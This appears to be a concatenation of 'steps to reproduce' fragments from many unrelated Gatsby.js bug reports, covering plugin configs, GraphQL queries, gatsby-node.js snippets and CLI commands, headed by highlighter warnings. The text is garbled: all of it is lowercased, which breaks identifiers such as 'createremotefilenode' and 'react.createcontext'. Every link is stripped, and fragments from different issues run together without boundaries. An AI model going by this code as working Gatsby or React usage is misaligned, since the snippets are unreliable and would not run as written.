warn unable to find prism language 'htaccess' for highlighting
applying generic code block
warn unable to find prism language 'styl' for highlighting
applying generic code block
warn unable to find prism language 'gql' for highlighting
applying generic code block
warn unable to find prism language 'ml' for highlighting
applying generic code block
warn unable to find prism language '.json' for highlighting
applying generic code block
warn unable to find prism language '.gitignore' for highlighting
applying generic code block
warn unable to find prism language 'bash:' for highlighting
applying generic code block
warn unable to find prism language 'dosini' for highlighting
applying generic code block
warn unable to find prism language 'flowchart' for highlighting
applying generic code block
enable showcaptions:true with latest version of plugin
add `![](./img.jpg)` to a markdown
- create a new gatsby project (`gatsby new gatsby-bug-mvce`)
- add these lines to `gatsby-node.js`:
const { createremotefilenode } = require("gatsby-source-filesystem") exports.sourcenodes = ({ actions, store, cache, createnodeid }) => { const { createnode } = actions return createremotefilenode({ url: " ", store, cache, createnode, createnodeid, }) .catch(err => { console.log("caught error:", err) }) .then(node => { console.log("created node:", node) })
> gatsby new test-site
> cd test-site
> gatsby develop [screenshot]( then, stop dev server
replace ./pages/index.js with the below..
import react from "react" const indexpage = () => ( <> <h1>hi people</h1> <p>welcome to your new gatsby site.</p> <p>now go build something great.</p> </> ) export default indexpage then run the dev server `> gatsby develop` view site in browser
[screenshot]( note the h1 is using the `-apple-system` font-family but no page styles have been provided
open up the developer tools to check things out..
[screenshot]( not sure why the reference to layout.css style exists
with the update to index.js i removed the <layout> component which is the source of the reference to `import "./layout.css"` i thought, maybe caching, so i opened up incognito and no luck
then i tried up safari (was using chrome prior)..
but the same result
next, stop dev server and then..
> gatsby clean
> gatsby develop viewed the site again, but the issue still exists
next, stop dev server
let's try something else..
let's build the static site and view the results versus using `gatsby develop`
> gatsby build
> gatsby serve [screenshot]( with the `build` command the result is as expected.
- set up a node type mapping [as described in the docs]( #mapping-node-types) for a field that contains a list of items (for example a playlist in markdown frontmatter): ``` // playlist.md --- title: test playlist tracks: - one (1) - deux (2) - tres (3) - vier (4) --- ``` ``` // track-one.yml --- title: one (1) artist: nielson --- ```
- query the list in your frontend code or graphiql and observe that the list is not ordered correctly anymore :( ![image]( not using a mapping and directly querying the track name as defined in the playlist's markdown file preserves the order of tracks, so it would be great if using a mapping did so, too
**[reproduction on codesandbox](
issue in google chrome - version 74.0.3729.157
install deps -> gatsby build see (mostly type definition - i added some information in comments)
load a page with a small viewport, navigate to another page on the site and grow the viewport to a size that would select a different image file source for the same image, visit that page again
the image cache key will be the same
the image will download regardless of distance from viewport, there will be no transition effect despite no browser image cache hit.
follow the steps in the readme.md file at the package.json scripts assume an osx/linux/unix shell of some kind, but you can probably reverse engineer what needs to happen for them to work on windows.
@media query { @import 'styles.css';
``` and ```
@import 'styles.css' print;
slightly modify [f74d723f037ca55068b456dc808ee3dd8ec563cc]( and send new pull request.
example: open in new tab: 1
click the link to "this subtitle" on the second line of text.
the back button will not be enabled, as the history is still only one element long.
install plug in
configure gtm and ga within gtm
per plug-in ([readme]( wire ga to the history change event in gtm.
* set up a gatsby site with: * `gatsby-source-filesystem` * `gatsby-source-contentful` * set up contentful example site, which includes sample posts * `gatsby-mdx` * `gatsby-transformer-remark`
* add `.md` and `.mdx` files in your file source location
* query `allmarkdownremark` and `allmdx`.
- `gatsby new repro `
- `gatsby build`
gatsby new blog
npm install
`npm audit fix` (works fine if you leave this out)
npm run build
upgrade to node 12
run `gatsby new something` and see the `yarn install` or `npm install` step fail as in #13780
in `gatsby-node.js`, on create nodes, i try to download multiple image for each node
clone repo: (which is just the gatsby blog starter with emotion)
run `gatsby develop`
parent theme: `gatsby-theme-parent`
child theme: `gatsby-theme-child` child package.json
"name": "gatsby-theme-child",
"dependencies": {
"gatsby-theme-parent": "0.0.1",
"react": "16.8.0",
"react-dom": "16.8.0",
``` child gatsby config
```javascript
module.exports = { __experimentalthemes: [ { resolve: "gatsby-theme-parent", options: {} } ],
``` failing directory structure
/test-project /gatsby-theme-parent /lib /gatsby-theme-child /node_modules gatsby-theme-parent (symlink -> /test-project/gatsby-theme-parent/)
try installing gatsby-plugin-sharp with node 12
go to these links and notice the images at the top of the readme files
the first one doesn't render correctly, the second one does.
you can check out the project i'm currently working on - visit the home page with safari ios or macos
- a video should start playing
- reload the page and the video is not loading anymore if you reproduce those steps with google chrome it works well
gatsby new my-blog-starter cd my-blog-starter
touch content/assets/delete_me
ln -s content/assets/delete_me content/assets/keep_me
rm -f content/assets/delete_me
gatsby develop
clone the gatsby repository
run `npm install`
pr to gatsbyjs/gastby, e.g
specifically the [circleci output](
clone [repo]( and run `gatsby develop`
it should not take many attempts to error out.
example frontmatter:
- - src: ../images/gatsby-astronaut.png - src: ../images/gatsby-icon.png
- - src: ../images/gatsby-astronaut.png - src: ../images/gatsby-icon.png
``` this query fails:
``` allmarkdownremark { edges { node { frontmatter { data { src { absolutepath } } } } } } }
``` [demo repo](
the demo repo was generated via `gatsby new `, [these]( are the only changes made.
run `gatsby develop`
all pages will feature a div with a red border above them
run `gatsby build` & `gatsby serve`
the red bordered div has been replaced with a generic div with no styling data.
upgrade from 2.1.7 to 2.1.8.
if the file system structure is this: ```
/static /test /index.html
``` running `gatsby develop`
# gatsby-config.js
module.exports = { ..
plugins: [ ..
{ resolve: `gatsby-plugin-manifest`, options: { name: `foo`, short_name: `bar`, start_url: `/?utm_source=homescreen`, background_color: `#111111`, display: `minimal-ui`, icon: `src/images/gatsby-icon.png`, include_favicon: false, legacy: false, theme_color_in_head: false, icons: [ { src: `favicon.ico`, sizes: `32x32`, type: `image/ico`, }, { src: `icons/icon-192x192.png`, sizes: `192x192`, type: `image/png`, }, ], }, }, ..
$ rm -rf public && gatsby build
generating image thumbnails [==============================] 6/6 0.3 secs 100%
error plugin gatsby-plugin-manifest returned an error error: vips__file_open_write: unable to open file "public/icons/icon-192x192.png" for writing unix error: no such file or directory
``` this happens because of #l72-l73 for the `include_favicon` issue, this is because that option is not listed at #l46-l55
create a page in contentful with slug `/404`.
- clone
- `yarn && yarn bootstrap`
- `cd packages/docs`
- `debug=gats*,cow* yarn build --verbose`
clone repository -
follow instructions to install, launch gatsby develop.
use web inspector to view sourcemap location works with any repository from starter library or fresh build of gatsby.
check out the [gatsby-schema-cache-bug-repro]( repo i just made to show off this bug
clone down the repo and install dependencies
do `gatsby develop` once and load the frontpage and see no issues
you should see a list of events with some dates.
stop the dev server, and run `gatsby develop` once again without clearing the cache
you should get an error stating `unknown argument "formatstring" on field "local_date" of type "syrevent".`
i have tried - disabling all plugins just to get through a build - using a fresh install with gatsby-starter - using the [shopify-starter]( (a forked version of gatsby-shopify) which works with the demo content, but not with my own store credentials
i am beginning to believe it is something to do with the store i am pulling from
the store is a live site with ~550 products and so i am apprehensions about posting any keys.
``` gatsby new fluid-test
in src/components/image.js, call `fluid` like so:
```javascript fluid(maxwidth: 500, maxheight: 400)
ping @thebigredgeek on company slack
- run `yarn start`
- open new terminal and add new package - `yarn add <package>`
- the dev terminal break into error and won't recover back
run `gatsby clean` or `gatsby info`
clone: git clone
yarn install
create started project
add global css imports with no side effects, for example:
import '@material/typography/dist/mdc.typography.css';
when you use require, everything works as expected:
require('@material/typography/dist/mdc.typography.css');
`gatsby new my-default-starter `
`cd my-default-starter/`
`npm install --save gatsby-plugin-typography react-typography typography typography-theme-fairy-gates`
add this to `gatsby-config.js` along with other plugins: ```javascript
module.exports = { plugins: [ { resolve: `gatsby-plugin-typography`, options: { pathtoconfigmodule: `src/utils/typography`, }, }, ],
create `src/utils/typography.js` and insert: ```javascript
import typography from "typography"
import fairygatetheme from "typography-theme-fairy-gates" const typography = new typography(fairygatetheme) export const { scale, rhythm, options } = typography
export default typography
save and run `gatsby develop`
observe error at ` `
install gatsby-plugin-netlify-cms@3.0.0-rc.1 and netlify-cms@2.8.0 and load up the /admin/ page.
i have a minimum reproducible condition at which is a clone of the `/examples/graphql-reference/` folder from gatsbyjs/gatsby@2.1.35
run `npm install`, then `npm run build`.
go to: shrink window down to ensure a decent amount of vertical scrolling
hit refresh (note it sometimes works right away but once it breaks it's broken for good)
if it didn't break right away do a few quick refresh spams and it should break
store with many products and images
try to query them all
add `gatsby-plugin-typography` to plugins array.
achieve a `null` in the headers in some way (e.g.: inside `<helmet/>`.
try to compile the site in some way `develop || build`.
- open `accept[.]oerol[.]nl` (remove brackets around dots, don't want it to get indexed)
- wait for serviceworker to install
- just the header and the footer will show up, no page visible for the first few seconds ------ - hard refresh (cmd+shift+r) / unregister the serviceworker (chrome devtools > application > serviceworkers)
- page is visible during initial load.
go to 2
restart server or run `yarn build`
see terminal output base gatsby sandbox with `gatsby-plugin-flow` added.
[repository with code](
clone
modify `content/blog/hello-world/index.md` so that the first paragraph has a link: `this is my first post on my new [fake blog]( how exciting!`
start the site with `gatsby develop` and read the excerpt on the hello world blog post
clone [my project at the tag `gatsbyjs-gatsby-12386`](
`yarn install`
`yarn develop --open`
notice the excerpts are not correct.
open brave browser and browse to
or navigate to the gatsby plugin page and search for google analytics plugin and click on the google analytics plugin.
git clone
cd reactjs.org
go to file: `gatsby-config.js`
find `dependencies` array and add `@material-ui/core` to that array
go to file: `content/docs/hello-world.md`
replace `[](codepen://hello-world)` by `[](codesandbox://hello-world)`
run project by: `npm run dev`
go to your browser: and click link `try it on codepen`
just open this in a browser:
use styled component with gatsby, install the plugin and in a different page from index reload the page
start `gatsby develop`, open a bunch of tabs simultaneously.
it's a bit hard to test, i had to intercept my requests to the api to figure out what's happening..
maybe use charles? code in my use case (like described [here]( #createremotefilenode)):
const auth = {
htaccess_user: "some_user",
htaccess_pass: "some_pass"
} const filenode = await createremotefilenode({ url: pictureurl, store, cache, createnode, createnodeid, auth });
- visit
- click on one of the posts
- see question mark next to the username ![screenshot 2019-02-27 at 13 47 27](
clone 2
include `gatsby-plugin-offline` in `gatsby-config.js` 3
can be done by running `now` 4
navigate to deployment website
refresh page
clone
`git checkout a5dff2c4bf3d4fdcc2a05c59294734832a421d3b`
`npm install`
`npm start`
navigate to `localhost:8000`
modify `src/pages/index.jsx`
1) visit
2) click on reactjs
2) click the purple visit site button
parent file
const appcontext = react.createcontext();
<appcontext.provider value={defaultvalue} children={children} />
children file
const {islogin} = react.usecontext(appcontext); or
git clone
gatsby build
create a new project
add the following to `gatsby-node.js` ```
const { createremotefilenode } = require(\'gatsby-source-filesystem\'); exports.sourcenodes = async ({ actions, store, cache, createnodeid }) => { const { createnode } = actions filenode = await createremotefilenode({ url: " ", cache, store, createnode, createnodeid });
`yarn develop`
observe the file will download and you can check in cache
$ ls -alt .cache/gatsby-source-filesystem/0d5a6ba9af7781580b3c59af9e560259/638831main_globe_east_2048.jpg
-rw-r--r-- 1 blake staff 536295 feb 24 21:23 .cache/gatsby-source-filesystem/0d5a6ba9af7781580b3c59af9e560259/638831main_globe_east_2048.jpg
$ cksum .cache/gatsby-source-filesystem/0d5a6ba9af7781580b3c59af9e560259/638831main_globe_east_2048.jpg
1844973668 536295 .cache/gatsby-source-filesystem/0d5a6ba9af7781580b3c59af9e560259/638831main_globe_east_2048.jpg
wait a few minutes and restart `yarn develop`.
check the cached remote files ```
$ ls -alt .cache/gatsby-source-filesystem/0d5a6ba9af7781580b3c59af9e560259/638831main_globe_east_2048.jpg
-rw-r--r-- 1 blake staff 536295 feb 24 21:24 .cache/gatsby-source-filesystem/0d5a6ba9af7781580b3c59af9e560259/638831main_globe_east_2048.jpg
$ cksum .cache/gatsby-source-filesystem/0d5a6ba9af7781580b3c59af9e560259/638831main_globe_east_2048.jpg
1844973668 536295 .cache/gatsby-source-filesystem/0d5a6ba9af7781580b3c59af9e560259/638831main_globe_east_2048.jpg
add rectangular svg (see below) to your project and modify gatsby-config.js to point to that svg
set gatsby-config.js:
```javascript { resolve: `gatsby-plugin-manifest`, options: { name: `favicon bug`, short_name: `bug`, start_url: `/`, background_color: `#ffffff`, theme_color: `#ca9e67`, display: `minimal-ui`, icon: `src/images/mountains.svg`, // this path is relative to the root of the site
include_favicon: true }, },
``` save svg to src/images/mountains.svg:
<?xml version="1.0" encoding="utf-8"?>
<!-- generator: adobe illustrator 23.0.1, svg export plug-in
svg version: 6.00 build 0) -->
<svg version="1.1" class="mountains" xmlns=" " xmlns:xlink=" " x="0px" y="0px" viewbox="0 0 47.5 32.9" style="enable-background:new 0 0 47.5 32.9;" xml:space="preserve">
<polygon points="0,32.9 16.5,6.6 18.9,10.5 17.9,11.8 16.5,9.6 2.8,31.3 44.8,31.4 27.7,2.9 15.3,22.9 24.7,22.9 21.3,17.2 22.3,16 27.5,24.4 12.4,24.4 27.7,0 47.5,32.9 " style="fill: #ca9e67"/>
with a fresh repo, navigate to gatsbygram, and run with `npm start`
visit the page on the browser and click an image to open a modal component
the pagerenderer component behind will re-render every time an image is clicked.
here's a link to the demo project:
website that demos the problem: source for the demo:
just clisk on link pairs and you will see difference between your local build and live site
see this repo:
* create a gatsby project from the hello world starter.
* add `gatsby-plugin-emotion` to the project.
* render the following component: ```js
import react from "react"; export default function component(props) { return <></>;
import { navigate } from 'gatsby'; navigate('#some-id', { replace: true });
codesandbox to replicate this bug: [codesandbox link](
scroll to mid page from top and let the scroll settle
you will see the jump to top of page every time.
this is the minimum possible reproduction i could come with
hope it's enough.
here is a [reproducible repo]( that illustrates the bug as well has links to a video illustrating it.
git clone git@github.com:mdornseif/gatsby-original-image-issue.git cd gatsby-original-image-issue ; yarn ; gatsby build # find image in original size find public/ -name salty_egg.jpg | xargs file | grep 2048x1536 public/static/8058f3f26913fea3b6a89a73344fe94a/105fb/salty_egg.jpg: jpeg image data, progressive, precision 8, 2048x1536, frames 3
create a new gatsby (v2) and integrate redux and redux-persist
create a custom html.js file (already tried without this file, problem remains) 3
install gatsby-plugin-react-helmet plugin
with gatsby-plugin-offline, after service worker is installed, on subsequent access, activestyle={{color: 'black'}} isn't applied to the link in footer
the interesting thing is in react devtools, activestyle is present (
everything works as expected without gatsby-plugin-offline.
source code is available here
above is a git repo with the project as i last left it
run npm install for node packages
run gatsby develop.
visit localhost/8000 an error screen should appear with the above error.
create model with a relationship, having: `categories: objectid("592b1a24eccb1ddddfe2d593")` in your document.
gatsby develop
create new project
run gatsby develop
(warning shows in console)
- use the above code, _or_ check out [this repo]( #diff-76a7ceef21a0a9f68cb5ca6205d6ac57r86)
setup plugin-react-css-modules
build site for production
``` createpage({ path: '/reference/mono-v6.x.x' component, });
i created that repository with these steps: 1
`gatsby new gatsby-plugin-netlify-cms-bug`
`cd gatsby-plugin-netlify-cms-bug`
`yarn add netlify-cms gatsby-plugin-netlify-cms`
added plugin to `gatsby-config.js`
updated all dependencies
to see a bug follow these steps:
`git clone `
`cd gatsby-plugin-netlify-cms-bug`
`yarn install`
`gatsby build` - it's a first build and it sometimes work at that moment
run `gatsby build` again - now bug should be visible, because gatsby is winning a race thanks to cache.
to see a bug run `gatsby serve` and check if scripts are running or open `chunk-map.json` file and see that it includes only chunks generated by the plugin
i tried to:
update all dependencies in `package.json` and even gatsby-cli.
move plugin at the top of array in `gatsby-config.js`
it didn't fixed the problem.
create a markdown page with an image in it
use a similar setup to below, **package.json**
```json "dependencies": { "gatsby": "^2.0.98", "gatsby-image": "^2.0.28", "gatsby-plugin-sharp": "^2.0.18", "gatsby-remark-copy-linked-files": "^2.0.8", "gatsby-remark-images": "^3.0.1", "gatsby-transformer-remark": "^2.2.0", "gatsby-transformer-sharp": "^2.1.12", "react": "^16.6.3", "react-dom": "^16.6.3" }
``` **gatsby-config.js** ```js
module.exports = { plugins: [ 'gatsby-plugin-sharp', 'gatsby-transformer-sharp', { resolve: 'gatsby-transformer-remark', options: { plugins: [ 'gatsby-remark-copy-linked-files', { resolve: 'gatsby-remark-images', options: { linkimagestooriginal: false, maxwidth: 800 } } ] } }, ]
``` **test-post.md** ```md
title: "test blog post"
date: "2017-07-02"
--- ![cat](cat.jpg)
change the name of the database in [`using-mongodb`]( #l9) and run `gatsby develop`.
attempt to access the return value of `await cache.set('a', 'b')` in your gatsby-node.js file inside of an api
mine was in the resolve of a new field in `exports.setfieldsongraphqlnodetype`.
test on a gatsby site with `gatsby-plugin-typography`, `react-typography` and `typography` installed
i will also use the `typography-theme-ocean-beach` theme for testing purposes as it relies on the google roboto font
create a `src/utils/typography.js` file: ```js
import typography from 'typography'
import oceanbeachtheme from 'typography-theme-ocean-beach' const typography = new typography(oceanbeachtheme) export default typography
create a `gatsby-config.js` file: ```js
module.exports = { plugins: [ { resolve: "gatsby-plugin-typography", options: { pathtoconfigmodule: "src/utils/typography", omitgooglefont: true } } ]
run `gatsby develop`
jump into the browser developer tools and take note that in the `<head>` it is still fetching the fonts from google font:
now run `gatsby build && gatsby serve`
note the correct result and that in the `<head>` it does not fetch anything form google fonts
here's a reproducible build repo: as said in the readme there, run `gatsby develop -h 0.0.0.0` and see the bug and then build the site and serve it and see that the image appears on ios.
here's a full description with a repro repo: i could probably get this example even smaller if it needs to be, but [gatsby-mdx's oncreatepage]( uses `deletepage` and so does the user's own `gatsby-node.js`.
the following `gatsby-config` makes it crash:
```javascript
module.exports = { plugins: [ { resolve: `gatsby-plugin-google-gtag`, options: { trackingids: [`ga_tracking_id`], }, }, ],
create a new wordpress site on wordpress.com, associate an `app` with it, provide the `url` and the `oauth` stuff in `gatsby-config.js`, create one more post, add `tags` and `category` for each of them, then run `gatsby develop`
install gatsby-offline-plugin with vanilla options in a project with a home page that has a colored background.
serve your build and access the root url of the website.
**problem 1:** open the [page])( scroll down a little bit (or a few sections, doesn't matter) and reload the page
you'll notice that the scroll jumps
i have the feeling that the scroll position is restored once the js kicks in, but this is a vague guess
**problem 2:** open the [page])( and hard reload the page a couple of times
you'll notice that the font is flashing and you can also sometimes see unstyled content.
enable mozjpeg in gatsby-config.js for `gatsby-plugin-sharp`: ```
// plugins: [ { resolve: `gatsby-plugin-sharp`, options: { usemozjpeg: true, }, },
``` use the default starter project with `gatsby new` and edit the `image.js` component to include `toformat: jpg`: ```
const image = () => ( <staticquery query={graphql` query { placeholderimage: file(relativepath: { eq: "gatsby-astronaut.png" }) { childimagesharp { fluid(maxwidth: 300 toformat: jpg) { ...gatsbyimagesharpfluid } } } } `} render={data => <img fluid={data.placeholderimage.childimagesharp.fluid} />} />
``` build the site, notice no error, check the image assets, eg the same dimension will be output 80 (despite the `maxwidth: 300`?) it is roughly 150kib, vs about 34kib when `mozjpeg` is not enabled
for the default displayed image of 30 , it's 9kib vs 40kib(mozjpeg)
it displays fine in the browser so can go unnoticed, if you use any image tools or for some file browsers(dolphin for me) the image preview may fail to generate because it's not actually a jpeg image when inspected
if unable to reproduce, this could be due to the build of mozjpeg installed to your system/os
some mozjpeg will support png input if they've been built with that support, mine does not
i can provide a reproducible project with an alpine docker container if interested.
i've create a sample repo where you can easily reproduce both bugs
see
[visit this example post](
check the author credit box at the top of the post: ![screenshot 2019-01-03 at 12 56 56]( [here's the markdown file for the above url](
note that there are other posts where this happens too.
go to gatsbyjs.org/showcase
click on any site
click on "visit site" button
once the site loads, click on back arrow voila, there is probably a white page.
- create fresh gatsby project on version >= 2.0.24
- follow gatsby guide:
- error occurs
follow this tutorial:
stop after modifying `gatsby-config.js` for the first time (version without explicit `pathtoconfigmodule`).
visit
more info on what i've been doing here:
[clone this repo](
run `yarn` or `npm install`
run `yarn build:staging`
the environment variable `api_key` in `.env.staging` should be present in the built code
1) create a new gatsby project from the hello world starter: ```
$ gatsby new testing-404
``` 2) install gatsby@2.0.66, run `gatsby develop` and see the proper 404 page
$ cd testing-404
$ yarn add gatsby@2.0.66
$ gatsby develop
# visit
``` 3) stop gatsby-develop, install gatsby@2.0.67, run `gatsby develop` and note the uncaught error page
$ yarn add gatsby@2.0.67
$ gatsby develop
# visit
make a graphql request like the following:
```graphql { allmarkdownremark { excerpt(format: html)
git clone && cd gatsby-starter-blog
npm i && npm start
add `gatsby-plugin-emotion` in a project and add a log to `onrenderbody` and notice it is not gettings called.
go to with "block third party cookies and site data" enabled (see
go to [
click on official and community starters! link
write a query for a content type with a single reference field which accepts multiple types
graphql errors out.
go to this link `
please take a look at the running example at codesandbox:
- include .env files as documented on - run production build
- inspect js bundle `app-*.js` for env vars
clone the repro repository: in this repo, this a simple gatsby project with `gatsby-styled-components`
the homepage have a `createglobalstylesheet`, the page `page-2` does not have one
`gatsby develop` navigate to the homepage, you'll see the background is red
navigate to page-2, by link or url and see that the background is not red
`gatsby build && npx serve public` navigate to the homepage, background is red
click on page-2 link, the background is white.
**but**, reload the page-2 for ssr render and see that background is red....
generate new gatsby project
gatsby new gatsby-site
install carbon components
npm install --save carbon-components carbon-components-react carbon-icons gatsby-plugin-sass
``` _gatsby-config.js_
module.exports = { plugins: [ 'gatsby-plugin-sass' ]
install styled components
npm install --save styled-components gatsby-plugin-styled-components
``` _gatsby-config.js_
module.exports = { plugins: [ 'gatsby-plugin-styled-components' ]
create a styled carbon components button _pages/index.js_
import react from 'react'
import button from '../components/button'
import '../styles'
import layout from '../components/layout' const indexpage = () => ( <layout> <button>hello</button> </layout>
) export default indexpage
``` _components/button/index.js_
import react, { component } from 'react'
import styled, { withtheme } from 'styled-components'
import { button } from 'carbon-components-react' class styledbutton extends component { get style() { return { ...this.props.style, } } render() { return <button {...this.props} style={this.style} /> }
} export default styled(withtheme(styledbutton))` color: blue; background-color: orange;
repo url: requirements: - contentful - have a contentmodel which has `labels` named field in it, also make an instance of it
steps: build the project twice
i wrote a [small gatsby project here]( that reproduces the issue
i have [deployed the repo here](
here's an outline of the reproducing process: 1
add `calc()` or calculation in parentheses `()` in some `calc()` function in one of your css files.
run `gatsby build`.
inspect the production css and see that your parentheses or nested calc() are gone (and your beautiful layout too).
have a drupal site with json api 2.x and a content type with image fields.
configure gatsby-source-drupal, and install the "sharp" related plugins.
run `gatsby develop` and inspect the schema, (try to query images)
you won't see 'localfile'
here's the code i'm using: specifically and contain the failing code path.
**[demo on codesandbox]( based on gatsby-starter-default, i'm adding this to **gatsby-node.js**: ```
const path = require('path'); exports.oncreatepage = async ({ page, actions }) => { const { createpage, deletepage } = actions; return new promise(resolve => { const oldpage = { ...page }; if (page.path === '/') { // replace index deletepage(oldpage); createpage({ ...page, matchpath: '/*', }); // create sub page createpage({ path: `/sub/`, matchpath: `/sub/*`, component: path.resolve(`./src/templates/sub.js`), }); } resolve(); });
open the homepage of gatsby.
open a [blogpost]( and hover over the authors image
this is how it looks.
<img width="146" alt="bildschirmfoto 2018-10-31 um 08 45 28" src=" ">
visit [any]( website starter pack url, and click the yellow share button on the right, above the website screenshot.
* create a simple starter site.
* copy the two files above (replace `some_query` with any valid graphql query)
* `gatsby build`
- git clone the `gatsbyjs/gatsby` repo
- `cd examples/using-remark`
- `yarn && yarn develop`
- go to `localhost:8000` and click on any link leading to a blog post
- one should see a blank page
use this codepen to reproduce the json.stringify crashing:
open the codepen, change the 5 to 500000 then open the devtools console to see the error message.
we we're able to build our website by using the `streamed json.stringify` technique instead
pr coming soon.
install the default gatsby starter
add a link to a google font in `layout.js` via `react-helmet`
create a `lato` class in `layout.css` with the necessary `font-family` declaration
add the `lato` class to the `<h1>` in `index.js`
install `gatsby-plugin-subfont` and add it to `gatsby-config.js`
run `gatsby build` here is a link to an example repo that followed the steps above and is seeing the `gatsby-plugin-subfont` errors during the build: [
open plugins page and thumbs up or down at the bottom of a remote plugin page readme.
(example:
* filter starters by "cosmic js"
* click on the `cosmicjs/gatsby-starter` starter (the first in the list)
open your cmd/ git cmd
clone the repository to you local machine
you local machine should have a special character in the file path name - in my case it was c:\\users\\shawna's pc\\hacktoberfest
execute 'npm i'
execute 'gatsby develop'
it will go through the process of compiling but throws and error - after investigating, it has a carrot under the ' special character - it doesn't like it and wont compile
if you take the code from the plugin, add it to your own `gatsby-node.js` file and then modify it a bit so it checks against other `page.paths` (ie, `/auth/` in my case), it fails to return from processing the paths even if you hit `/auth/*`
by _returning_, it all works as expected.
following graphql query: ```
childimagesharp { fluid( maxwidth: 600 maxheight: 600 ) { ...gatsbyimagesharpfluid_tracedsvg }
``` and usage: ```
<img fluid={childimagesharp.fluid} />
visit a post you haven't visited before, that has images, such as that has images.
visit
focus search input, type in `createpage`, click first result
<img width="749" alt="screen shot 2018-10-16 at 11 55 20 am" src=" ">
you are taken to this page: #oncreatepage-api
add config: `gatsby-plugin-emotion`, { resolve: `gatsby-transformer-remark`, options: { plugins: [ { resolve: `gatsby-remark-images`, options: { // it's important to specify the maxwidth (in pixels) of // the content container as this plugin uses this as the // base for generating different widths of each image
maxwidth: 1200, linkimagestooriginal: false, backgroundcolor: 'transparent', withwebp: true, }, }, ], }, }, render with custom ast function: export const renderast = new rehypereact({ createelement: react.createelement, components: { 'main-cta': maincta, 'buy-product-button': buyproductbutton, 'youtube': (props) => <youtubeembeed {...props}/>, h1: types.h1, h2: types.h2, h3: types.h3, p: types.paragraph, a: (props) => <types.link {...props} to={props.href}/>, li: types.li, ul: types.ul, }, }).compiler add some markdown with h1, h2 and paragraphs
some paragraphs are rendered just as `<p>text</p>` instead of the p with the class from emotion-js
- only happens in the output build on the first page render - if i change page and i come back the <p> has the classname - happens in the same places on every re-build - sometimes the first <p/> immediately below a <h2/> - sometimes the first <p/> immediately below a <h1/> - sometimes 2nd <p/> below a <h2/> (first <p/> in this case renders correctly) - i have a side bar that renders on many pages
it is broken only on the home page
- consistent in different browsers (even google fetch sees the same bug) - all broken text is from the home page, path "/"
follow the instructions for setting up the gatsby prismjs plugin
the only thing i have done is in my gatsby-browser - i do ```
import "prismjs/themes/prism-okaidia.css"
import "prismjs/plugins/line-numbers/prism-line-numbers.css"
``` here is the part of my config ``` { resolve: `gatsby-transformer-remark`, options: { plugins: [ { resolve: `gatsby-remark-prismjs`, options: { classprefix: "language-", inlinecodemarker: null, aliases: {}, showlinenumbers: true, noinlinehighlight: false } } ] } }
``` this is the markup that i am using
// gatsby-node.js const { graphqlobjecttype, graphqljson, graphqlboolean,
} = require('gatsby/graphql') const customtype = new graphqlobjecttype({ name: 'customtype', fields: { first: { type: graphqljson }, second: { type: graphqljson }, // adding this dummy field prevents the crash // _repair: { type: graphqlboolean }, },
}) exports.setfieldsongraphqlnodetype = ({ type }) => { if (type.name !== 'markdownremark') { return {} } return { customfield: { type: customtype, resolve: () => ({ first: { hello: 'world' }, second: { hello: 'world' }, }), }, }
``` the crash happens because [graphql type validation]( #l532) expects at least one field, but none get added for `graphqljson` in `infer-graphql-input-fields-from-fields` because json is not listed in [`scalarfiltermap`]( #l84)
### possible solutions as a workaround, adding a dummy non-json field prevents the crash (see above).
adding something like the following to `scalarfiltermap` does as well, but not sure if this is the correct way to go about this:
json: { eq: { type: graphqljson }
* create a page template that consumes `markdownremark.tableofcontents` [(e.g.)]( #l84-l90)
* create a markdown page with one or more headings [(e.g.)](
* add an inline code block on one of the headings
take a look at the [starters]( page on your smartphone or on mobile resolution with your dev tools.
add another acf flexible content field inside the parent flexible content field.
demo project: ```sh
# build with prefix `/public`
$ yarn build --prefix-paths # start a local server
$ python3 -m http.server # open
i've changed the example for remark, so that it queries by `id` rather than `slug`
in [this demo]( , all you need to do is edit some of the blog markdown and see the (lack of) change in the browser.
my app is based on the [using-multiple-providers example]( along with the gatsby-source-graphql plugin
the following custom webpack config allows the page to load as expected: ```js
exports.oncreatewebpackconfig = ({ actions }) => { actions.setwebpackconfig({ module: { rules: [ { test: /\\.mjs$/, include: /node_modules/, type: 'javascript/auto', }, ], }, resolve: { extensions: ['.mjs', '.js', '.json'], }, });
export the component and the query of a page template component in one compound statement.
add the `img` from `gatsby-image` and browse the resulting web page with a screen reader
i am not adding any code as this happens for all instances.
go to click on `docs` link
in the `src/pages` folder, create a "dot" file, such as `.markdownlint.json` which does not export a react component
{ "first-heading-h1": false, "md013": false, "first-line-h1": false
``` run `gatsby build` and observe the build error
notice though that `gatsby develop` **does** work correctly.
- npm install gatsby 2.0.7 and gatsby-plugin-remove-trailing-slashes 2.0.0
- add gatsby-plugin-remove-trailing-slashes plugin to gatsby-node.js
- run gatsby develop
- enter an unknown route
add gatsby-transformer-remark and gatsby-remark-images to your `gatsby-config.js`
run `gatsby develop` with a non-existent `.cache`
check the properties on `sitepageconnectionplugincreatorpluginoptionsinputobject` <img width="650" alt="screen shot 2018-09-21 at 12 09 16 pm" src=" "> 4
run `gatsby develop` with a warm `.cache`
check for new properties on `sitepageconnectionplugincreatorpluginoptionsinputobject` <img width="651" alt="screen shot 2018-09-21 at 12 10 33 pm" src=" ">
in the examples/no-trailing-slashes gatsby folder * run the build, then gatsby serve
* load up - as the first page you view on the site
* click on the link for
* press back button
login to netlify cms
reload page (redirects to admin)
login again
run gatsby development server with `gatsby develop --host=0.0.0.0`.
access the app from ` `
the app will not load since all the urls are constructed in the form of ` ` including static files and webpack dev server.
use gatsby-image on safari
is a good example, but it seems to affect any site built with gatsby
my project, the gatsby-image demo site, and the main gatsby site are all being affected from what i saw.
sorry, i don't have a small repro, first wanted to ask whether i'm not doing anything stupid
the nodes are generated from a custom plugin that fetches images from remote urls
if this indeed looks like a bug, i'll prepare a small repro repo.
* `gatsby new hello-world `
* `yarn add gatsby-plugin-sass gatsby-plugin-react-css-modules`
* `touch gatsby-config.js`
* add the following to `gatsby-config.js`: ```js
module.exports = { plugins: [ { resolve: 'gatsby-plugin-sass' }, { resolve: 'gatsby-plugin-react-css-modules', options: { filetypes: { '.scss': { syntax: 'postcss-scss' } }, exclude: '\\/global\\/' } } ]
``` * `gatsby develop`
upload a .jpeg file to contentful
load the image in graphql using `tracedsvg`
i executed:
- gatsby new gatsby-site
- i added some pages
- gatsby build
- firebase deploy (or gatsby serve) - enter a page that does not exist, for example:
in gatsby-node.js, change matchpath of a page:
exports.oncreatepage = ({ page, actions }) => { const { createpage } = actions if (page.path === `/mypage/`) { page.matchpath = `/mypath/*` createpage(page) } } ```
